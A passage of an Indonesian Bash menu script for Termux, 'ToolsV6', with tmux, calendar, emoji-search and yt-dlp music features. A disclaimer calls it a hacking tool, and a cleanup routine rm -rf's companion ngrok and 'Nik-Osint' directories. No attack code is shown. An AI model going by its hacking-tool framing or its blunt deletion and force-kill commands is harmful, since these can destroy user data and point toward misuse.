    echo -e "${r}[ ${g}x ${r}]${y} Modules tmux blum terinstal, Menginstal..!!"
    sleep 2 
    echo -e "${n}"
    pkg install tmux -y
    clear 
}
clear
echo "
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛🟥🟥🟥🟥⬛🟩🟩🟩🟩⬛
⬛🟥🟥🟥🟥⬛🟩🟩🟩🟩⬛
⬛🟥🟥🟥🟥⬛🟩🟩🟩🟩⬛
⬛🟥🟥🟥🟥⬛🟩🟩🟩🟩⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛🟦🟦🟦🟦⬛🟨🟨🟨🟨⬛
⬛🟦🟦🟦🟦⬛🟨🟨🟨🟨⬛
⬛🟦🟦🟦🟦⬛🟨🟨🟨🟨⬛
⬛🟦🟦🟦🟦⬛🟨🟨🟨🟨⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
"
echo -e "${g}"
read -p "Apakah kamu ingin membuat 4 terminal? (y/n) : " jawab
if [[ "$jawab" == "y" || "$jawab" == "Y" ]]; then
    tmux new-session \; \
        split-window -h \; \
        split-window -v \; \
        select-pane -t 0 \; \
        split-window -v \; \
        select-layout tiled
elif [[ "$jawab" == "n" || "$jawab" == "N" ]]; then
    echo ""
    echo -e "${c} Keluar dari tools..!!"
    echo ""
else
    clear 
    echo ""
    echo -e "${y} Pilihan tidak valid, membuka tmux default..!!"
    echo ""
    sleep 2 
    clear
    tmux
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $tm == "8" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Tm !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
b='\033[34;1m'
echo ""
echo -e "${r} Developer ${g}: ${c}Thxyzz404"
echo -e "${y}"
read -p "Masukkan kata kunci : " query
if [[ -z "$query" ]]; then
  echo ""
  echo -e "${r}❌ Kata kunci kosong!"
  echo ""
fi
echo ""
echo -e "${c}⌛ Mencari \"$query\" ⌛"
encoded_query=$(echo $query | sed 's/ /%20/g')
url="https://emojicombos.com/$encoded_query"
xdg-open "$url"
echo ""
echo -e "${g}✅ Browser telah dibuka."
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $tm == "9" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Tm !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
r='\033[31;1m'
n='\033[0m'
echo -e "${n}"
HARI=("Minggu" "Senin" "Selasa" "Rabu" "Kamis" "Jumat" "Sabtu")
BULAN=("Januari" "Februari" "Maret" "April" "Mei" "Juni"
"Juli" "Agustus" "September" "Oktober" "November" "Desember")
bulan=$1
tahun=$2
[ -z "$bulan" ] && bulan=$(date +%m)
[ -z "$tahun" ] && tahun=$(date +%Y)
bulan=$((10#$bulan))
hari_ini=$(date +%d)
bulan_ini=$(date +%m)
tahun_ini=$(date +%Y)
hari_ini=$((10#$hari_ini))
bulan_ini=$((10#$bulan_ini))
tahun_ini=$((10#$tahun_ini))
nama_bulan=${BULAN[$bulan-1]}

{
echo "        $nama_bulan $tahun"
printf "%-8s%-8s%-8s%-8s%-8s%-8s%-8s\n" "${HARI[@]}"
cal $bulan $tahun | tail -n +3 | while read -r line; do
for i in {1..7}; do
tgl=$(echo $line | awk -v col=$i '{print $col}')
if [ -z "$tgl" ]; then
     printf "%-8s" ""
else
     if [ "$tgl" -eq "$hari_ini" ] && [ "$bulan" -eq "$bulan_ini" ] && [ "$tahun" -eq "$tahun_ini" ]; then
     printf "${r}%-7s${n} " "$tgl"
else
     printf "%-7s " "$tgl"
  fi
fi
done
echo ""
done
} | boxes -d stone
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$tm" == "bk" ]]; then
break
else
mpv --no-video --quiet "$HOME/Yalakan/salah.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/Tidak_Ada.mp3" &> /dev/null &
echo -e "${bold_bg}${green} Menu Tidak Ada Di ToolsV6 ${n}"
sleep 6
clear
fi
done
}
bug() {
clear
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
pesan=$(
echo "Assalamualaikum Bang Ada Bug Pada ToolsV6 bang."
)
isipesan="$pesan"
xdg-open "https://t.me/yayayaya0618?text=$pesan"
clear
}
musik() {
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Musik !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear
cd $HOME
b='\033[34;1m'
h='\033[32;1m'
u='\033[35;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
k='\033[33;1m'
ajg="ansi-rounded"
if ! command -v yt-dlp &> /dev/null; then
    clear
    echo ""
    echo -e "${c} Modules blum terinstal menginstall..!!"
    echo -e "${n}"
    pkg install python ffmpeg mpv git -y
    pip install yt-dlp
fi
musik_on() {
    if pgrep -x mpv > /dev/null; then
        echo -e "${r}[ ${g}!! ${r}]${c} Musik Sudah Sedang Berjalan..!!"
        return
    fi
    if [ ! -s musik.txt ]; then
        echo -e "${r} Daftar musik.txt Kosong Atau Tidak Ditemukan..!!"
        return
    fi
    echo -e "${k} Daftar Musik [ musik.txt ]"
    echo ""
    cat musik.txt | boxes -d "$ajg" | lolcat
    echo ""
    echo -e "${r} Sedang Memutar Musik Di Latar Belakang..!!${c}"
    nohup mpv --no-video --quiet --playlist=musik.txt > /dev/null 2>&1 &
}
music_off() {
    if pgrep -x mpv > /dev/null; then
        pkill mpv
        echo ""
        echo -e "${r} Musik Berhasil Dihentikan..!!"
    else
        echo -e "${p} Tidak Ada Musik Yang Sedang Diputar..!!"
    fi
}
add_music() {
    echo -e "${c}"
    read -p "Masukkan Link YouTube Musik : " new_link
    echo ""
    if [[ "$new_link" == https://* ]]; then
        echo "$new_link" >> musik.txt
        echo -e "${k} Link Berhasil Ditambahkan Ke musik.txt..!!"
        echo -e "${r} Daftar Musik Sekarang..!!"
        sleep 2
        echo -e "${h}"
        cat musik.txt | boxes -d "$ajg" | lolcat
    else
        echo ""
        echo -e "${r} Link Tidak Valid. Harus Diawali Dengan [ https:// ]"
    fi
}
lihat_daftar() {
    echo ""
    echo "DAFTAR LINK MUSIK" | boxes -d "$ajg" | lolcat
    echo ""
    if [ -s musik.txt ]; then
        nl musik.txt | sed 's|https://youtu.be/||' | sed 's|https://www.youtube.com/watch?v=||' | \
        awk '{printf "│ %-3s %-30s │\n", $1, $2}' | \
        boxes -d "$ajg" | lolcat
    else
        echo ""
        echo "Belum Ada Link Musik Yang Ditambahkan..!!" | boxes -d "$ajg" | lolcat
    fi
}
clear
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
echo "
███╗   ███╗██╗   ██╗███████╗██╗██╗  ██╗
████╗ ████║██║   ██║██╔════╝██║██║ ██╔╝
██╔████╔██║██║   ██║███████╗██║█████╔╝
██║╚██╔╝██║██║   ██║╚════██║██║██╔═██╗
██║ ╚═╝ ██║╚██████╔╝███████║██║██║  ██╗
╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝ Setting To Plaay
" | lolcat
echo -e "\033[36;1m╔════════════════════════════════════╗"
echo -e "\033[36;1m║  ${r}SOUND MANAGER SETTING TOOLSV6!!${c}   ║"
echo -e "\033[36;1m╚════════════════════════════════════╝"
echo -e "\033[36;1m║   ${r}[ ${k}01 ${r}] ${h}Mode Online Musik!! \033[36;1m      ║"
echo -e "\033[36;1m║   ${r}[ ${k}02 ${r}] ${h}Tambah Link Musik!! \033[36;1m      ║"
echo -e "\033[36;1m║   ${r}[ ${k}03 ${r}] ${h}Mode Offline Musik!! \033[36;1m     ║"
echo -e "\033[36;1m║   ${r}[ ${k}04 ${r}] ${h}Lihat Daftar Musik!! \033[36;1m     ║"
echo -e "\033[36;1m║   ${r}[ ${k}05 ${r}] ${h}Setting File Musik!!\033[36;1m      ║"
echo -e "\033[36;1m║   ${r}[ ${k}06 ${r}] ${h}Hapus File Musik!! \033[36;1m       ║"
echo -e "\033[36;1m║   ${r}[ ${k}07 ${r}] ${h}Link Musik Admin!!\033[36;1m        ║"
echo -e "\033[36;1m║   ${r}[ ${k}08 ${r}] ${h}Perbaiki Bugs Musik!!\033[36;1m     ║"
echo -e "\033[36;1m║   ${r}[ ${k}09 ${r}] ${k}Keluar Terminall!!  \033[36;1m      ║"
echo -e "\033[36;1m║   ${r}[ ${k}10 ${r}] ${k}Kembali Ke ToolsV6!!  \033[36;1m    ║"
echo -e "\033[36;1m╔════════════════════════════════════╗"
echo -e "\033[36;1m║  ${r}SOUND MANAGER SETTING TOOLSV6!!${c}   ║"
echo -e "\033[36;1m╚════════════════════════════════════╝"
echo -e "${h}"
read -p "Masukkan pilihan anda : " input
echo ""
case $input in
    1|01)
        musik_on
        echo ""
        echo -e "${h}Musik Online Mode Aktif..!!"
        sleep 3
        clear
        ;;
    2|02)
        add_music
        echo ""
        echo -e "${b}Penambahan Musik Selesai..!!"
        sleep 3
        clear 
        ;;
    3|03)
        music_off
        echo ""
        echo -e "${k}Musik Berhasil Dihentikan..!!"
        sleep 3 
        clear 
        ;;
    4|04)
        lihat_daftar
        echo -e "${r}"
        read -p "Tekan Enter Untuk Kembali Ke Menu..!!"
        clear
        ;;
    5|05)
        nano musik.txt
        clear 
        ;;
    6|06)
        clear 
        rm -rf musik.txt
        echo ""
        echo -e "${h} Berhasill Menghapus File Musik..!!"
        sleep 3
        clear
        ;;
    7|07)
file="musik.txt"
links=(
"https://youtu.be/f_z2FUyLZ4I?si=pUStdc8TyOFnedYG"
"https://youtu.be/ALzvSPXmeh8?si=P67t5S8JlbaFfwrC"
"https://youtu.be/SBu9ZKBu-p4?si=1LTfwvIh5snH2ILt"
"https://youtu.be/kGobHQ7z8X4?si=lI1qMS61cnJ5GNFo"
"https://youtu.be/tSmdUF6Q68Y?si=CdnBwbvTs-WDklpB"
"https://youtu.be/vKitfen0VLI?si=p3WEuIivkxv2NDie"
)
check_and_add() {
    if ! grep -Fxq "$1" "$file"; then
        echo "$1" >> "$file"
        clear
        echo ""
        echo -e "${r}Sedang Menambahkan Link Musik..!!"
        echo ""
        echo -e "${h}Berhasill Ditambahkan Ke $file"
        sleep 2
        clear
    else
        clear
        echo ""
        echo -e "${h}Sedang Mengecek File Musik..!!"
        echo ""
        echo -e "${r}Link Sudah Ada Di File $file"
        sleep 2
        clear
    fi
}
check_and_add "${links[1]}"
check_and_add "${links[2]}"
check_and_add "${links[3]}"
check_and_add "${links[4]}"
check_and_add "${links[5]}"
check_and_add "${links[6]}"
check_and_add "${links[7]}"
check_and_add "${links[8]}"
check_and_add "${links[9]}"
check_and_add "${links[0]}"
nano "$file"
    ;;
 8|08)
clear
echo ""
echo -e "${g} Sedang Memperbaiki Alat Musik..!!"
sleep 3
echo -e "${b}"
pkg uninstall python ffmpeg mpv git -y 2>/dev/null || true
pip uninstall yt-dlp -y 2>/dev/null || true
pkg install python ffmpeg mpv git -y
pip install --upgrade yt-dlp
clear
echo ""
echo -e "${r} Musik Selesai Di Perbaiki..!!"
sleep 3
clear
   ;;
 9|09)
echo ""
echo -e "${r} Kluar dari ToolsV6"
echo ""
pkill -9 -f com.termux
  ;;
    10)
        echo ""
        echo -e "${c}Keluar Dari Tools Setting Manager..!!"
        sleep 2
        clear 
        ;;
    *)
        echo -e "${r}Perintah Tidak Dikenali..!!"
        sleep 2
        clear 
        ;;
esac
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
}
pemberitahuan() {
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
clear 
y='\033[33;1m'
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
n='\033[0m'
txt() {
  local text="$1"
  local delay="${2:-0.03}"
  local color="${3:-}"
  local i char
  if [ -n "$color" ]; then
    printf "%b" "$color"
  fi
  for ((i=0; i<${#text}; i++)); do
    char="${text:i:1}"
    printf "%s" "$char"
    sleep "$delay"
  done
  printf "\n"
  if [ -n "$color" ]; then
    printf "%b" "$n"
  fi
}
echo ""
txt " PEMBERITAHUAN..!!" 0.03 "$g"
echo ""
txt " Apa Itu ToolsV6? ToolsV6 Adalah" 0.03 "$r"
txt " Sebuah Alat Hacking Yang Menyimpan Dalam Satu Tempat" 0.03 "$c"
txt " Dan Dapat Di Gunakan Dalam Berbagai Tools Lainya." 0.03 "$c"
txt " Saya tidak bertanggung jawab atas di salah gunakan" 0.03 "$r"
txt " Pada ToolsV6 ini..!!" 0.03 "$c"
echo -e "${y}"
read -p " SILAHKAN TEKAN ENTER UNTUK MELANJUTKANNYA!! : " p
clear
}
keluar() {
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
sleep 2
echo -e "${bold_bg}${bold_green} KELUAR DARI TOOLSV6 ${n}"
echo ""
sleep 3
pkill -9 -f com.termux
}
delete() {
cache() {
    clear 
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${y} Memulai pembersihan repository lama..!!"
    sleep 2
    echo ""
    targets=(
        "$HOME/ngrok"
        "$HOME/Nik-Osint"
        "$HOME/Yalakan"
        "$HOME/pkg_checked.txt"
        "$HOME/kocol0421galaxymekdecodertai999-goyangbnghahaha404"
        "$PREFIX/tmp/.ajgtaibangkekbngsatsetantolkontololjmboatpjue"
    )
    cleaned=0    
    for target in "${targets[@]}"; do
        if [ -e "$target" ]; then
            rm -rf "$target"
            echo -e "${r}[ ${g}✓ ${r}]${c} Berhasil membersihkan : $target"
            cleaned=1
        fi
    done
    sleep 2
    clear
    lol
}
lol() {
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
         echo "
                    ⢀⣴⣿⣿⣿⣷⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣬⣭⣥⣤⣤⣄⣀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄
⠀⠀⠀⣠⠞⢛⣷⡾⠟⠁⠀⠀⠀⠀⠀⢀⣾⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿
⠀⢠⡟⢁⣴⣿⣯⠀⢀⣤⣤⣤⣤⣤⣤⣿⣿⡟⠁⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠀⣠⣿⠟⢋⣭⠙⣡⣈⠻⠿⠿⠿⠿⠿⠟⠋⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠸⠟⠁⣀⣈⢋⣀⣘⣉⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠀⢸⣿⡿⣿⣿⢿⣿⢿⣿⡿⢿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠀⠸⣿⡇⣿⣿⢸⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢿⣿⣿⣿⡇⠸⣿⣿
⠀⠀⣿⡇⢻⣿⢸⣿⢸⣿⠇⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⡧⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⣿⣧⢸⣿⢸⣿⢸⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⡗⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⢸⣿⢸⣿⢸⣿⢸⣿⢸⣿⠃⠀⠀⠀⠀⠀⠀⢸⣿⣿⣏⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⢸⣿⠈⣿⢸⣿⢸⡟⢸⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡧⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⠈⣿⣿⣿⣾⣿⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠏⠀⢻⣿⣿⠇⠀
   " | lolcat
    echo -e "${p} Development ${n}: ${g}Thxyzz404"
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${y} Semua telah di bersihkan."
    echo ""
}
cache
echo ""
echo -e "${bold_bg}${bold_gren}Tekan Enter Untuk Melanjutkannya.${n}"
read -r -p $'\033[1;41m\033[1;32mSilahkan Tekan Enter..!!\033[0m '
clear
}
while true; do
main_menu
done
